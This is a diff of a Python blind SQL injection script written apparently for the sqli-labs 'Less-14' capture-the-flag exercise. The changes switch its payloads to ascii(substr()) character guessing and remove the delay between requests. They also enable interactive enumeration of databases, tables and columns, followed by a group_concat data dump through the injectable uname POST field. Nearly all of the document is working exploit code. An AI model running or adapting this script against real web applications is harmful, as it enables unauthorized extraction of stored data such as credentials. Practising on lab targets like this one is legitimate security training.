@@ -3,7 +3,7 @@ from time import sleep
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://de7363c6-7bb7-4a20-a589-8db221e03407.node4.buuoj.cn/Less-14/'
+baseurl = 'http://127.0.0.1:81/Less-14/'
 # less13:')  less14:"
 poc = '\"'
 postData = {
@@ -11,12 +11,10 @@ postData = {
     'passwd': '1',
     'submit': 'Submit'
 }
-delayBetweenRequests = 1
 
 
 def post(url, header=standardHeader, data=postData):
     res = req.post(url, headers=header, data=data)
-    sleep(delayBetweenRequests)
     return res
 
 
@@ -37,15 +35,14 @@ def forceDatabases(pocUrl, okText):
         if not checkRes(res.text, okText):
             print("Database length is {}\nForcing each char".format(databaseConcatLength))
             allDatabases = ''
-            payload = " and left(" + payload + ",{})='{}' -- -"
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
             for index in range(1,databaseConcatLength+1):
                 for char in sqlForce:
-                    nowDatabases = allDatabases + char
                     expData = {'passwd': '1', 'submit': 'Submit',
-                               'uname': postData['uname'] + payload.format(str(index), nowDatabases)}
+                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                     res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
-                        allDatabases = nowDatabases
+                        allDatabases = allDatabases + char
                         print(allDatabases)
                         break
             return allDatabases
@@ -61,15 +58,14 @@ def forceTables(pocUrl, database, okText):
         if not checkRes(res.text, okText):
             print("table length is {}\nForcing each char".format(tableConcatLength))
             allTables = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
             for index in range(1, tableConcatLength+1):
                 for char in sqlForce:
-                    nowTables = allTables + char
                     expData = {'passwd': '1', 'submit': 'Submit',
-                               'uname': postData['uname'] + payload.format(str(index), nowTables)}
+                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                     res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
-                        allTables = nowTables
+                        allTables = allTables + char
                         print(allTables)
                         break
             return allTables
@@ -85,22 +81,21 @@ def forceColumns(pocUrl, table, okText):
         if not checkRes(res.text, okText):
             print("columns length is {}\nForcing each char".format(columnConcatLength))
             allColumns = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
             for index in range(1, columnConcatLength+1):
                 for char in sqlForce:
-                    nowColumns = allColumns + char
                     expData = {'passwd': '1', 'submit': 'Submit',
-                               'uname': postData['uname'] + payload.format(str(index), nowColumns)}
+                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                     res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
-                        allColumns = nowColumns
+                        allColumns = allColumns + char
                         print(allColumns)
                         break
             return allColumns
 
 
 def dumpData(pocUrl, okText, database, table, column='*'):
-    payload = "(select {} from {}.{})".format(column, database, table)
+    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
     print("Forcing all data's length")
     for dataConcatLength in range(1, 9999):
         expData = {'passwd': '1', 'submit': 'Submit',
@@ -109,15 +104,14 @@ def dumpData(pocUrl, okText, database, table, column='*'):
         if not checkRes(res.text, okText):
             print("data length is {}\nForcing each char".format(dataConcatLength))
             allData = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
             for index in range(1, dataConcatLength+1):
                 for char in sqlForce:
-                    nowData = allData + char
                     expData = {'passwd': '1', 'submit': 'Submit',
-                               'uname': postData['uname'] + payload.format(str(index), nowData)}
+                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                     res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
-                        allData = nowData
+                        allData = allData + char
                         print(allData)
                         break
             return allData
@@ -126,14 +120,14 @@ def dumpData(pocUrl, okText, database, table, column='*'):
 if __name__ == '__main__':
     okText = 'flag.jpg'
     res = post(baseurl)
-    # # databases = forceDatabases(baseurl, okText)
-    # print('Input a database to force all tables:')
-    # database = input()
-    # # tables = forceTables(baseurl, database, okText)
-    # print('Input a table to force all columns:')
-    # table = input()
-    # # columns = forceColumns(baseurl, table, okText)
-    # print('Input a column to force all data:')
-    # dumpColumn = input()
-    data1 = dumpData(baseurl, okText, database='ctftraining', table='flag', column='flag')
+    databases = forceDatabases(baseurl, okText)
+    print('Input a database to force all tables:')
+    database = input()
+    tables = forceTables(baseurl, database, okText)
+    print('Input a table to force all columns:')
+    table = input()
+    columns = forceColumns(baseurl, table, okText)
+    print('Input a column to force all data:')
+    dumpColumn = input()
+    data1 = dumpData(baseurl, okText, database=database, table=table, column=dumpColumn)
     print(data1)
